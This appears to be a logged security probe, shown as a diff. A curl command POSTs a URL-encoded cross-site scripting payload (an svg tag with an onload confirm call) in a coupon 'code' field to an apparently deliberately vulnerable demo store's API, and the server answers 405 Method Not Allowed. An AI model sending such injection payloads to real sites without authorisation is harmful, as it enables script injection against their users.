@@ -1,0 +1,6 @@
+# command: timeout 15 curl -s -m 13 -o - -w '\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d code=s5c1737f3b430a4%22%3E%3Csvg+onload%3Dconfirm%281%29%3E https://duck-store.escape.tech/api/v1/orders/coupons
+# exit_code: 0
+# ---
+
+{"detail":"Method Not Allowed"}
+HTTP_STATUS:405
